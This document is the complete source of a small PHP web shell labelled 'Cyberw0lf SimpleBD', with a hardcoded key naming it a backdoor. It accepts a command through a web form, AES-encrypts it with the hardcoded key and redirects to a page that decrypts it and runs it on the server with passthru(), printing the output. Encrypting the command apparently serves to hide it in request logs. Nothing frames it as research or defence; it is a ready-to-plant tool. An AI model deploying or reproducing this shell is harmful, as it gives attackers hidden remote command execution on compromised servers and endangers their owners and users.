<!DOCTYPE html>
<html>
<head>
    <title>Cyberw0lf SimpleBD</title>
</head>
<body>
    <?php
    
    $ekey = "_17anB4ckd00r1945";
    
    function encryptAES($data, $key) {
        $cipher = "aes-256-cbc";
        $iv = random_bytes(openssl_cipher_iv_length($cipher));
        $encrypted = openssl_encrypt($data, $cipher, $key, 0, $iv);
        return base64_encode($iv . $encrypted);
    }

    function decryptAES($data, $key) {
        $cipher = "aes-256-cbc";
        $data = base64_decode($data);
        $iv_length = openssl_cipher_iv_length($cipher);
        $iv = substr($data, 0, $iv_length);
        $encrypted = substr($data, $iv_length);
        return openssl_decrypt($encrypted, $cipher, $key, 0, $iv);
    }

    if (isset($_GET['x'])) {
        $x = $_GET['x'];
        $encrypted_x = encryptAES($x, $ekey);
        $target_url = "con.php?y=" . urlencode($encrypted_x);
        header("Location: " . $target_url);
        exit;
    }

    if (isset($_GET['y'])) {
        $encrypted_x = $_GET['y'];
        $decrypted_x = decryptAES($encrypted_x, $ekey);
        
    }
    ?>

    <form action="" method="get">
        <label for="x">Command : </label>
        <input type="text" name="x" id="x">
        <input type="submit" value="Execute">
    </form>
    <br><pre>
    <?php 
    	echo passthru($decrypted_x);
    ?>
    </pre>
</body>
</html>
